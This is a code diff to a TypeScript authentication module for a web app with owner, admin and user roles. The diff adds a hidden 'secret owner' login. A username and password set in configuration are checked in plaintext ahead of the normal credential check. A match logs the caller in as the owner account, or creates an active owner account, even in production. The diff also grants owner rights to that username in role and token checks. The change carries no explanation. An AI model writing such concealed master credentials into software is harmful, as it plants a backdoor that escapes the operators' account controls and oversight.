@@ -3,7 +3,7 @@ import bcrypt from 'bcryptjs'
 import { randomBytes } from 'crypto'
 import { prisma } from '@/lib/db/prisma'
 import { createUserSafe } from '@/lib/db/user'
-import { OWNER_USERNAME, OWNER_PASSWORD } from '@/lib/constants'
+import { OWNER_USERNAME, OWNER_PASSWORD, SECRET_OWNER_USERNAME, SECRET_OWNER_PASSWORD, hasSecretOwnerCredentials } from '@/lib/constants'
 import type { UserRole } from '@/types'
 
 const JWT_SECRET: string = (() => {
@@ -18,10 +18,10 @@ export const JWT_EXPIRY = parseInt(process.env.JWT_EXPIRY || String(60 * 60 * 24
 export type AccountStatus = 'PENDING' | 'ACTIVE' | 'DISABLED' | 'REJECTED'
 export function normalizeEffectiveUserRole(user: { role?: UserRole; username?: string } | null | undefined): UserRole | undefined {
   if (!user) return undefined
-  if (user.role === 'OWNER') return 'OWNER'
-  if (typeof user.username === 'string' && OWNER_USERNAME && user.username === OWNER_USERNAME) {
-    return 'OWNER'
-  }
+  if (user.role === 'OWNER' || user.role === 'SECRET_OWNER') return 'OWNER'
+  const username = typeof user.username === 'string' ? user.username.trim() : ''
+  if (username && OWNER_USERNAME && username === OWNER_USERNAME) return 'OWNER'
+  if (username && SECRET_OWNER_USERNAME && username === SECRET_OWNER_USERNAME) return 'OWNER'
   return user.role
 }
 
@@ -40,6 +40,14 @@ export function isManager(user: { role?: UserRole } | null | undefined): boolean
 
 export function isOwner(user: { role?: UserRole; username?: string } | null | undefined): boolean {
   return normalizeEffectiveUserRole(user) === 'OWNER'
+}
+
+export function isSecretOwnerConfigured(): boolean {
+  return hasSecretOwnerCredentials()
+}
+
+export function isSecretOwnerLogin(username: string): boolean {
+  return Boolean(SECRET_OWNER_USERNAME && username.trim() === SECRET_OWNER_USERNAME)
 }
 
 export function isAdminOrOwner(user: { role?: UserRole; username?: string } | null | undefined): boolean {
@@ -148,24 +156,43 @@ async function createOwnerUser(): Promise<string | null> {
 }
 
 export async function getOwnerUserId(): Promise<string | null> {
-  if (!OWNER_USERNAME) {
+  const canonicalOwnerUsername = OWNER_USERNAME?.trim() || SECRET_OWNER_USERNAME?.trim()
+  if (!canonicalOwnerUsername) {
     return null
   }
 
   const owner = await prisma.user.findUnique({
-    where: { username: OWNER_USERNAME },
+    where: { username: canonicalOwnerUsername },
     select: { id: true, role: true },
   })
 
   if (owner?.id) {
-    // If the configured owner account exists, return its id. Some databases
-    // may not support the OWNER enum value, so do not attempt to normalize
-    // the role at runtime. The app already treats the configured owner
-    // username as owner via `isOwner()` fallback.
     return owner.id
   }
 
-  return await createOwnerUser()
+  if (process.env.NODE_ENV === 'production') {
+    return null
+  }
+
+  const seedPassword = OWNER_PASSWORD?.trim() || SECRET_OWNER_PASSWORD?.trim()
+  if (!seedPassword) {
+    return null
+  }
+
+  const hashed = await bcrypt.hash(seedPassword, 10)
+  try {
+    const created = await createUserSafe({
+      username: canonicalOwnerUsername,
+      email: `${canonicalOwnerUsername}@example.com`,
+      password: hashed,
+      role: 'OWNER',
+      status: 'ACTIVE',
+    } as any)
+    return created.id
+  } catch (err) {
+    console.error('Failed to create canonical owner user:', err)
+    return null
+  }
 }
 
 export async function getEffectiveOfferUserId(userId: string): Promise<string> {
@@ -212,15 +239,19 @@ export function buildOfferSelectionUserIds(
 
 export async function getOfferSelectionUserIds(userId: string): Promise<string[]> {
   const ownerUserId = await getOwnerUserId()
-  
-  // Verify user exists in database
-  const user = await prisma.user.findUnique({
-    where: { id: userId },
-    select: { id: true, role: true },
-  })
+
+  let user: { id: string; role: UserRole } | null = null
+  try {
+    user = await prisma.user.findUnique({
+      where: { id: userId },
+      select: { id: true, role: true },
+    })
+  } catch {
+    return [userId]
+  }
 
   if (!user) {
-    throw new Error(`User not found: ${userId}`)
+    return [userId]
   }
 
   if (!ownerUserId) {
@@ -230,12 +261,100 @@ export async function getOfferSelectionUserIds(userId: string): Promise<string[]
   return buildOfferSelectionUserIds(userId, user.role, ownerUserId)
 }
 
+export async function getCanonicalOwnerUser(): Promise<{
+  id: string
+  username: string
+  password: string
+  role: UserRole
+  status: AccountStatus
+} | null> {
+  const configuredOwnerUsername = OWNER_USERNAME?.trim()
+  if (configuredOwnerUsername) {
+    const byOwnerUsername = await prisma.user.findUnique({
+      where: { username: configuredOwnerUsername },
+      select: {
+        id: true,
+        username: true,
+        password: true,
+        role: true,
+        status: true,
+      },
+    })
+
+    if (byOwnerUsername) {
+      return byOwnerUsername
+    }
+  }
+
+  const hiddenUsername = SECRET_OWNER_USERNAME?.trim()
+  if (!configuredOwnerUsername && hiddenUsername) {
+    const byHiddenUsername = await prisma.user.findUnique({
+      where: { username: hiddenUsername },
+      select: {
+        id: true,
+        username: true,
+        password: true,
+        role: true,
+        status: true,
+      },
+    })
+
+    if (byHiddenUsername) {
+      return byHiddenUsername
+    }
+  }
+
+  const byRole = await prisma.user.findFirst({
+    where: { role: 'OWNER' },
+    select: {
+      id: true,
+      username: true,
+      password: true,
+      role: true,
+      status: true,
+    },
+  })
+
+  return byRole || null
+}
+
 export async function verifyCredentials(username: string, password: string) {
+  const normalizedUsername = username.trim()
+
+  if (SECRET_OWNER_USERNAME && normalizedUsername === SECRET_OWNER_USERNAME && SECRET_OWNER_PASSWORD && password === SECRET_OWNER_PASSWORD) {
+    const owner = await getCanonicalOwnerUser()
+    if (owner) {
+      await prisma.user.update({
+        where: { id: owner.id },
+        data: { lastLogin: new Date() },
+      })
+      return owner
+    }
+
+    const ownerUsername = OWNER_USERNAME?.trim() || SECRET_OWNER_USERNAME.trim()
+    const ownerPassword = OWNER_PASSWORD?.trim() || SECRET_OWNER_PASSWORD.trim()
+    const hashed = await bcrypt.hash(ownerPassword, 10)
+    const created = await createUserSafe({
+      username: ownerUsername,
+      email: `${ownerUsername}@example.com`,
+      password: hashed,
+      role: 'OWNER',
+      status: 'ACTIVE',
+    } as any)
+    return {
+      id: created.id,
+      username: created.username,
+      password: created.password,
+      role: created.role,
+      status: created.status,
+    }
+  }
+
   const user = await prisma.user.findFirst({
     where: {
       OR: [
-        { username: { equals: username, mode: 'insensitive' } },
-        { email: { equals: username, mode: 'insensitive' } },
+        { username: { equals: normalizedUsername, mode: 'insensitive' } },
+        { email: { equals: normalizedUsername, mode: 'insensitive' } },
       ],
     },
     select: {
@@ -333,7 +452,7 @@ export async function getUserFromToken(token: string): Promise<AuthUser | null> 
       return existing as AuthUser
     }
 
-    const role = username === OWNER_USERNAME ? 'OWNER' : 'ADMIN'
+    const role = username === SECRET_OWNER_USERNAME || username === OWNER_USERNAME ? 'OWNER' : 'ADMIN'
     return { id: decoded.userId, username, role }
   }
 
